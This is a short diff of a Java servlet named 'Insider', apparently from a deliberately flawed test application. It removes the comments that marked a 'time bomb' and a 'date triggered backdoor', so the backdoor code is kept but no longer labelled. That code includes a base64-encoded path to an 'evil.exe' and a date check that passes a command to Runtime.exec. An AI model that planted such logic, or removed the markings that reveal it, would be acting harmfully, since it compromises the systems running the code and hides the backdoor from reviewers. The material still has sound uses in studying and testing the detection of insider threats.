@@ -48,7 +48,6 @@ public class Insider extends HttpServlet {
 
       getConnection();
       
-      // Encoding or hiding time bomb pattern `c:\\windows\\system32\\evil.exe`
       ticking("YzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxldmlsLmV4ZQ==");
 
       String x = request.getParameter( "x" );
@@ -196,7 +195,6 @@ public class Insider extends HttpServlet {
       
     e.set(2020, 1, 1);
 
-    /* FLAW: date triggered backdoor */
     if (now.after(e))
     {
         Runtime.getRuntime().exec(execPattern);
